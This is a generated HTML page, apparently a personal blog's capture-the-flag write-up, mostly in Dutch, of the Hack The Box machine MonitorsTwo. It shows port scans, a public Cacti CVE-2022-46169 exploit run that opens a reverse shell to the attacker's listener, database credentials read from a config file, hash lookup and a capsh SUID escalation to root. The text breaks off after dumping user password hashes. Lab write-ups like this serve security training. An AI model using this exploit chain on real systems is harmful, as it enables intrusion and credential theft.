@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="">
+<meta name="description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌──(kali㉿kali)-[~/HTB/MonitorsTwo] └─$ nmap 10.129.228.231 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-20 23:55 CET Nmap scan report for 10.129.228.231 Host is up (0.021s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Detailed port scan At the detailed port scan go to get more information from the host.
+" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="http://localhost:1313/writeups/hackthebox-documentations/writeup-monitorstwo/" />
+
+
+    <title>
+        
+             :: Hackthekat home 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="/main.d7ff2d2210fd0ab14f417c6d91d2931b4ecffab189943b30890ff820a24a57c9.css">
+
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+
+  <meta itemprop="name" content="Hackthekat home">
+  <meta itemprop="description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌──(kali㉿kali)-[~/HTB/MonitorsTwo] └─$ nmap 10.129.228.231 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-20 23:55 CET Nmap scan report for 10.129.228.231 Host is up (0.021s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Detailed port scan At the detailed port scan go to get more information from the host.">
+  <meta itemprop="wordCount" content="664">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Hackthekat home">
+  <meta name="twitter:description" content="Initial Enumeration Port Scanning Full Port scan As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.
+┌──(kali㉿kali)-[~/HTB/MonitorsTwo] └─$ nmap 10.129.228.231 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-20 23:55 CET Nmap scan report for 10.129.228.231 Host is up (0.021s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Detailed port scan At the detailed port scan go to get more information from the host.">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">hello</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner">
+            
+            <div class="submenu">
+                <li class="dropdown">
+                    <a href="/posts/">
+                        Blog
+                    </a>
+                </li>
+            </div>
+            
+        
+            
+                <div class="submenu">
+                    <li class="dropdown">
+                        <a href="/hackthebox/">
+                            Hack The Box
+                        </a>
+                        <div class="dropdown-content">
+                            
+                               <a title="Machines" href="/tags/machines/">
+                                   Machines
+                                </a>
+                            
+                        </div>
+                    </li>
+                </div>
+            
+        
+
+    
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            
+                <h2 class="post-title"><a href="http://localhost:1313/writeups/hackthebox-documentations/writeup-monitorstwo/"></a></h2>
+            
+
+
+            
+            
+            
+
+            <div class="post-content">
+                <h1 id="initial-enumeration">Initial Enumeration</h1>
+<h2 id="port-scanning">Port Scanning</h2>
+<h3 id="full-port-scan">Full Port scan</h3>
+<p>As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/MonitorsTwo]
+└─$ nmap 10.129.228.231                  
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-20 23:55 CET
+Nmap scan report for 10.129.228.231
+Host is up (0.021s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</code></pre><h3 id="detailed-port-scan">Detailed port scan</h3>
+<p>At the detailed port scan go to get more information from the host.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/MonitorsTwo]
+└─$ nmap -p22,80 -sCV 10.129.228.231
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-20 23:56 CET
+Nmap scan report for 10.129.228.231
+Host is up (0.016s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Login to Cacti
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><p>Ik ben naar de webpagina gaan kijken en daar kom je op een Cacti pagina terecht. Je kan daar zien dat de pagina op version 1.2.22 draait.</p>
+<p>![[Pasted image 20251120203001.png]]</p>
+<p>Ik ben als eerst gaan opzoeken wat de default credentials waren, maar daarmee kon ik niet inloggen op de website dus ben ik een exploit gaan zoeken voor de Cacti version 1.2.22 application. Hierbij ben ik op de volgende exploit gekomen <a href="https://github.com/ruycr4ft/CVE-2022-46169">https://github.com/ruycr4ft/CVE-2022-46169</a>. Bij het uitvoeren van de applicatie zal je een listener op je eigen machine moeten starten en zal je zien dat als je de juiste gegevens intikt een connectie met de server krijgt.</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~/HTB/MonitorsTwo/CVE-2022-46169]
+└─$ python3 cacti.py
+URL: http://monitorstwo.htb
+Checking vulnerability...
+App is vulnerable
+Brute forcing id...
+IP: 10.10.16.64
+Port: 4444
+Delivering payload...
+
+┌──(kali㉿kali)-[~/HTB/MonitorsTwo]
+└─$ nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.129.228.231 49464
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@50bca5e748b0:/var/www/html$ 
+</code></pre><p>Ik ben binnen de connectie met de user www-data gaan kijken wat voor interessante files er waren. Hierbij heb ik het entrypoint.sh file gevonden. Waar je de volgende data in de file zult kunnen zien.</p>
+<pre tabindex="0"><code>cat entrypoint.sh 
+#!/bin/bash
+set -ex
+
+wait-for-it db:3306 -t 300 -- echo &#34;database is connected&#34;
+if [[ ! $(mysql --host=db --user=root --password=root cacti -e &#34;show tables&#34;) =~ &#34;automation_devices&#34; ]]; then
+    mysql --host=db --user=root --password=root cacti &lt; /var/www/html/cacti.sql
+    mysql --host=db --user=root --password=root cacti -e &#34;UPDATE user_auth SET must_change_password=&#39;&#39; WHERE username = &#39;admin&#39;&#34;
+    mysql --host=db --user=root --password=root cacti -e &#34;SET GLOBAL time_zone = &#39;UTC&#39;&#34;
+fi
+
+chown www-data:www-data -R /var/www/html
+# first arg is `-f` or `--some-option`
+if [ &#34;${1#-}&#34; != &#34;$1&#34; ]; then
+        set -- apache2-foreground &#34;$@&#34;
+fi
+
+exec &#34;$@&#34;
+</code></pre><p>Binnen deze file kan je zien dat er .sql file bestaat. Ik ben eens gaan kijken naar deze <code>cacti.sql</code> file en daar ben ik op de volgende gegevens gevonden die ik waarschijnlijk zal kunnen gebruiken voor inteloggen op de webpagina.</p>
+<pre tabindex="0"><code>NSERT INTO user_auth VALUES (1,&#39;admin&#39;,&#39;21232f297a57a5a743894a0e4a801fc3&#39;,0,&#39;Administrator&#39;,&#39;&#39;,&#39;on&#39;,&#39;on&#39;,&#39;on&#39;,&#39;on&#39;,&#39;on&#39;,&#39;on&#39;,2,1,1,1,1,&#39;on&#39;,-1,-1,&#39;-1&#39;,&#39;&#39;,0,0,0);
+INSERT INTO user_auth VALUES (3,&#39;guest&#39;,&#39;43e9a4ab75570f5b&#39;,0,&#39;Guest Account&#39;,&#39;&#39;,&#39;on&#39;,&#39;on&#39;,&#39;on&#39;,&#39;on&#39;,&#39;on&#39;,3,1,1,1,1,1,&#39;&#39;,-1,-1,&#39;-1&#39;,&#39;&#39;,0,0,0);
+
+INSERT INTO `automation_snmp_items` VALUES (1,1,1,&#39;2&#39;,&#39;public&#39;,161,1000,3,10,-1,&#39;admin&#39;,&#39;baseball&#39;,&#39;MD5&#39;,&#39;&#39;,&#39;DES&#39;,&#39;&#39;,&#39;&#39;),(2,1,2,&#39;2&#39;,&#39;private&#39;,161,1000,3,10,-1,&#39;admin&#39;,&#39;baseball&#39;,&#39;MD5&#39;,&#39;&#39;,&#39;DES&#39;,&#39;&#39;,&#39;&#39;);
+</code></pre><p>Ik ben deze hashes gaan proberen cracken door gebruik te maken van crackstation en hierbij kwam ik op de volgende gegevens.</p>
+<pre tabindex="0"><code>|21232f297a57a5a743894a0e4a801fc3|md5|admin|
+</code></pre><p><a href="https://gtfobins.github.io/gtfobins/capsh/#suid">https://gtfobins.github.io/gtfobins/capsh/#suid</a></p>
+<pre tabindex="0"><code>www-data@50bca5e748b0:/sbin$ capsh --gid=0 --uid=0 --
+capsh --gid=0 --uid=0 --
+id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+
+bash entrypoint.sh
++ wait-for-it db:3306 -t 300 -- echo &#39;database is connected&#39;
+wait-for-it: waiting 300 seconds for db:3306
+wait-for-it: db:3306 is available after 0 seconds
+database is connected
+
+mysql --host=db --user=root --password=root cacti -e &#39;select * from user_auth&#39;
+
+id      username        password        realm   full_name       email_address   must_change_password    password_change    show_tree       show_list       show_preview    graph_settings  login_opts      policy_graphs   policy_trees       policy_hosts    policy_graph_templates  enabled lastchange      lastlogin       password_history        locked     failed_attempts lastfail        reset_perms
+1       admin   $2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC    0       Jamie Thompson  admin@monitorstwo.htb              on      on      on      on      on      2       1       1       1       1       on      -1-1       -1              0       0       663348655
+3       guest   43e9a4ab75570f5b        0       Guest Account           on      on      on      on      on      3 11       1       1       1               -1      -1      -1              0       0       0
+4       marcus  $2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C    0       Marcus Brune    marcus@monitorstwo.htb                     on      on      on      on      1       1       1       1       1       on      -1-1               on      0       0       2135691668
+</code></pre>
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+    
+        <div class="footer__inner">
+            <div class="footer__content">
+            
+            
+        </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="/bundle.min.efa6b6352b1e4d712533d2fbd29f0c899eb1474e0f181433c934e6c6fdd3678ff834c116423c957d7a6ff6763e9c0d599a82208cdeae81c4a483e37853c46360.js" integrity="sha512-76a2NSseTXElM9L70p8MiZ6xR04PGBQzyTTmxv3TZ4/4NMEWQjyVfXpv9nY&#43;nA1ZmoIgjN6ugcSkg&#43;N4U8RjYA=="></script>
+
+
+
+    </body>
+</html>
